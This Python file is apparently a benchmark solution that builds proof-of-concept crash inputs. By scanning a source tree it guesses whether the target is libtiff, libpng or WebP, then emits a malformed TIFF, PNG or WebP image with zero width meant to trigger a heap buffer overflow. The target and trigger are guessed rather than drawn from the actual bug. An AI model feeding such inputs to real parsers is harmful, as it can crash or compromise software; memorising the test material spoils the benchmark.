import os
import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # Heuristic detection of the target library based on source files
        target_type = self._detect_target(src_path)
        
        if target_type == 'png':
            return self._generate_png_poc()
        elif target_type == 'webp':
            return self._generate_webp_poc()
        else:
            # Default to TIFF as it is the most common target for "zero width/height" 
            # heap buffer overflows in OSS-Fuzz (e.g., libtiff)
            return self._generate_tiff_poc()

    def _detect_target(self, src_path: str) -> str:
        for root, dirs, files in os.walk(src_path):
            if any(f.startswith('tif_') for f in files) or 'libtiff' in root:
                return 'tiff'
            if 'png.c' in files or 'libpng' in root:
                return 'png'
            if 'dec' in dirs and 'src' in root and 'webp' in root:
                return 'webp'
        return 'tiff'

    def _generate_tiff_poc(self) -> bytes:
        # Generate a TIFF with ImageWidth = 0 and ImageLength = 10
        # This often triggers heap buffer overflows in allocation or loop logic
        
        # TIFF Header: Little Endian ("II"), Magic 42, Offset to IFD 8
        header = b'II\x2a\x00\x08\x00\x00\x00'
        
        # IFD Entries setup
        # Structure: Tag (2), Type (2), Count (4), Value/Offset (4)
        # Type 3 = SHORT, Type 4 = LONG
        entries = [
            (256, 4, 1, 0),       # ImageWidth = 0 (TRIGGER)
            (257, 4, 1, 10),      # ImageLength = 10
            (258, 3, 1, 8),       # BitsPerSample = 8
            (259, 3, 1, 1),       # Compression = 1 (None)
            (262, 3, 1, 1),       # PhotometricInterpretation = 1 (BlackIsZero)
            (277, 3, 1, 1),       # SamplesPerPixel = 1
            (278, 4, 1, 10),      # RowsPerStrip = 10
            (279, 4, 1, 200),     # StripByteCounts = 200
        ]
        
        # Calculate offset for StripOffsets (273)
        # Header (8) + IFD Count (2) + Entries (12 * 9) + NextIFD (4)
        # We have 8 entries defined above + 1 for StripOffsets = 9
        ifd_offset = 8
        num_entries = len(entries) + 1
        ifd_size = 2 + (num_entries * 12) + 4
        data_offset = ifd_offset + ifd_size
        
        entries.append((273, 4, 1, data_offset))
        
        # TIFF requires tags to be sorted by ID
        entries.sort(key=lambda x: x[0])
        
        # Build IFD
        ifd = struct.pack('<H', num_entries)
        for tag, typ, count, val in entries:
            ifd += struct.pack('<HHII', tag, typ, count, val)
        
        # Next IFD Offset (0)
        ifd += struct.pack('<I', 0)
        
        # Strip Data (Garbage)
        data = b'\xCC' * 200
        
        return header + ifd + data

    def _generate_png_poc(self) -> bytes:
        # Generate PNG with width = 0
        signature = b'\x89PNG\r\n\x1a\n'
        
        # IHDR: Width=0, Height=10, Depth=8, Color=0
        ihdr_data = struct.pack('>IIBBBBB', 0, 10, 8, 0, 0, 0, 0)
        ihdr_chunk = self._make_png_chunk(b'IHDR', ihdr_data)
        
        # IDAT: Minimal data
        raw_data = b'\x00' * 100
        compressed = zlib.compress(raw_data)
        idat_chunk = self._make_png_chunk(b'IDAT', compressed)
        
        # IEND
        iend_chunk = self._make_png_chunk(b'IEND', b'')
        
        return signature + ihdr_chunk + idat_chunk + iend_chunk

    def _make_png_chunk(self, type_: bytes, data: bytes) -> bytes:
        length = struct.pack('>I', len(data))
        crc = zlib.crc32(type_ + data) & 0xffffffff
        crc_bytes = struct.pack('>I', crc)
        return length + type_ + data + crc_bytes

    def _generate_webp_poc(self) -> bytes:
        # Generate WebP with VP8 width = 0
        # VP8 Header: 3 bytes sig, 2 bytes width, 2 bytes height
        vp8_data = b'\x9D\x01\x2a' # Keyframe signature
        vp8_data += struct.pack('<H', 0) # Width = 0
        vp8_data += struct.pack('<H', 10) # Height = 10
        vp8_data += b'\x00' * 50
        
        chunk_len = len(vp8_data)
        pad = b'\x00' if chunk_len % 2 == 1 else b''
        
        vp8_chunk = b'VP8 ' + struct.pack('<I', chunk_len) + vp8_data + pad
        
        file_size = 4 + len(vp8_chunk)
        riff = b'RIFF' + struct.pack('<I', file_size) + b'WEBP'
        return riff + vp8_chunk
